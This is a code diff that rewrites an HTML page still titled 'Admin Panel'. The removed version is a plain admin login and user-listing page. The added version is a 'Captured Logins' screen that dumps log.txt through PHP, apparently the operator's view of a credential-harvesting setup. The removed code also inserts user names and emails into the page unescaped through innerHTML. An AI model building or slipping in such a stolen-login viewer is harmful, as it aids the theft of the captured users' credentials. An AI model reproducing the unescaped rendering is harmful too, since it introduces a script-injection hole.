@@ -1,52 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Admin Panel</title>
-    <style>
-        body { font-family: Arial; background: #f8f9fa; }
-        .container { max-width: 400px; margin: 50px auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        input, button { width: 100%; padding: 10px; margin: 5px 0; }
-        button { background: #28a745; color: white; border: none; }
-        button:hover { background: #1e7e34; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th, td { border: 1px solid #ddd; padding: 8px; }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Admin Panel</title>
 </head>
-<body>
-<div class="container">
-    <h2>Admin Login</h2>
-    <input id="adminEmail" placeholder="Admin Email">
-    <input id="adminPass" type="password" placeholder="Admin Password">
-    <button onclick="adminLogin()">Login</button>
-    <div id="userTable"></div>
-</div>
-
-<script>
-const API = "https://YOUR-BACKEND-URL.onrender.com"; // Replace after hosting
-let token = "";
-
-async function adminLogin() {
-    const res = await fetch(API + "/admin/login", {
-        method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            email: document.getElementById("adminEmail").value,
-            password: document.getElementById("adminPass").value
-        })
-    });
-    const data = await res.json();
-    if (data.token) {
-        token = data.token;
-        loadUsers();
-    } else {
-        alert("Invalid Admin Credentials");
-    }
-}
-
-async function loadUsers() {
-    const res = await fetch(API + "/admin/users", { headers: { Authorization: "Bearer " + token } });
-    const users = await res.json();
-    document.getElementById("userTable").innerHTML = "<h3>Users:</h3><table><tr><th>Name</th><th>Email</th></tr>" + users.map(u => `<tr><td>${u.name}</td><td>${u.email}</td></tr>`).join("") + "</table>";
-}
-</script>
+<body style="background:#111; color:#0f0; font-family:monospace; padding:20px;">
+  <h1>Captured Logins</h1>
+  <pre><?php echo file_get_contents("log.txt"); ?></pre>
 </body>
 </html>
